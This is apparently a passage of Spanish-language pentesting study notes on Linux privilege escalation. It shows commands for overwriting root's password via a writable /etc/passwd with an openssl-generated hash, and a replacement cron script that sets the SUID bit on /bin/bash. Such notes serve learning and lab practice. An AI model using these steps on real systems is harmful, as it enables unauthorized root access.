-- - 
## /etc/passwd

Si realizamos un barrido a nivel de sistema para ver que archivos tienen permisos de escritura
```bash
find / -writable 2>/dev/null
```

Si luego de eso encontramos que podemos escribir sobre el /etc/passwd (nada normal) podemos con openssl generar un hash de una contraseña la cual pueda interpretar el archivo y asi cambiar la contraseña al usuario root 
```bash 
openssl passwd
"Contraseña nueva"
```
-- - 
## Script con privilegios en directorio personal

Si el usuario root tiene definida una tarea Cron que ejecuta un script en nuestro directorio personal de trabajo, podemos eliminarlo para asi crear otro archivo con el mismo nombre y poner por ejemplo este contenido.
```bash
#!/bin/bash 

chmod u+s /bin/bash

# Con este comando podemos quedarnos viendo y ejecutando a la vez de manera secuencial un comando y su output
watch -n 1 ls -l /bin/bash
```

-- - 
